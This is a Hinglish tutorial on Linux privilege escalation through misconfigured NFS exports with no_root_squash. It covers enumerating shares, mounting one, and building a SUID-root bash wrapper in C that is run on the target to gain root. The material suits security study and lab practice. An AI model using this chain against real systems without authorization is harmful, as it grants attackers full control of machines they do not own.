# Linux PrivEsc via NFS (Network File System)

## 1. NFS Kya Hai ?

NFS ka matlab hai **Network File System**. Yeh ek protocol hai jo Linux systems ko allow karta hai ki wo files aur directories ko network ke through share kar sakein jaise wo local drive ho.

---

## 2. NFS Enumeration

Sabse pehle humein yeh dekhna hota hai ki target machine par kaunsa folder (mount point) share ho raha hai.

- **Tool:** `showmount`

- **Command:**

    ```
       showmount -e <Target_IP>
    ```

_Is command se pata chalega ki kaunsa directory (e.g., `/tmp`, `/home`, `/var/www`) export ho raha hai._


---

## 3. NFS Mount Kaise Karte Hain?

Agar humein koi share mil jata hai, toh hum use apni machine (Attacker machine) par mount karte hain.

1. Apni machine par ek folder banayein: `mkdir /tmp/mount_point`
    
2. Target ke folder ko mount karein:
    

Bash

```
    sudo mount -t nfs <Target_IP>:/shared_folder /tmp/mount_point -o nolock
```

## 4. `no_root_squash` Kya Hai? (The Vulnerability)
NFS mein ek security feature hota hai jise **Root Squashing** kehte hain.
*   **Normal Behavior:** Agar aap root hokar NFS share par file banate hain, toh NFS use `nobody` ya `nfsnobody` user mein convert kar deta hai (safety ke liye).
*   **Vulnerability:** Agar `/etc/exports` file mein **`no_root_squash`** option set hai, toh iska matlab hai ki agar aap apni machine par root hain, toh target machine bhi aapko **root** hi maanegi.

---
## 5. Privilege Escalation Steps (Practical)

Jab humein pata chal jaye ki `no_root_squash` enable hai, tab hum ye steps follow karte hain:

### Step 1: Payload Taiyar Karna
Apni machine par ek simple C program likhein (`rootbash.c`) jo system shell ko root permission ke saath run kare:

```

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

### Step 2: Compile Karna

```
gcc rootbash.c -o rootbash
```

### Step 3: Mounted Folder mein Move Karna

Is compiled file ko mounted directory mein copy karein aur use **SUID bit** de dein:

```
cp rootbash /tmp/mount_point/
chmod +xs /tmp/mount_point/rootbash
```

_(Yahan `+s` ka matlab hai ki ye file jisne banayi hai (root), uski permissions ke saath execute hogi)._

### Step 4: Target Par Execute Karna

Ab wapas target machine ke terminal par jayein aur us folder mein jakar file run karein:


```
cd /shared_folder
./rootbash
```

**Boom!** we are **root** .

---